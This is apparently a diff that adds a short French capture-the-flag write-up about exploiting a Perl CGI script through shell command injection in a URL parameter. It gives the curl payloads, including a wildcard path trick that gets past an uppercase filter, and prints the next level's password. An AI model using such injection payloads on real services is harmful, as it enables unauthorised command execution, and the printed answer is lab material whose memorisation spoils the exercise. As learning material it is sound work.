@@ -1,0 +1,27 @@
+Il sagit cette fois d'exploiter un code en perl.
+
+Il prend 2 parametres (x et y).
+Un toupper est applique sur x, puis les espace sont supprimes.
+
+la commande shell suivante est interpretee:
+`egrep "^$xx" /tmp/xd 2>&1`
+avec $xx notre x de depart passe dans les 2 regex.
+
+Si on met :
+curl localhost:4646?x='`getflag > /etc/pass`'
+
+Cela ne marche pas a cause des regex.
+
+On peut Donc mettre "getflag > /tmp/pass" dans un fichier nomme en majuscule (/tmp/COMMAND).
+Puis changer les droits (chmod 777 /tmp/COMMAND).
+
+Mais "curl localhost:4646?x='`/tmp/command`'" ne fonctionne pas a cause de tmp change en TMP. 
+On peut donc tester avec la subtitution *:
+curl localhost:4646?x='`/*/command`'
+
+Ceci fonctionne. On peut recureper le mot de passe de level13 dans /tmp/pass:
+
+cat /tmp/pass
+
+Mot de passe de level13:
+g1qKMiRpXf53AWhDaU7FEkczr
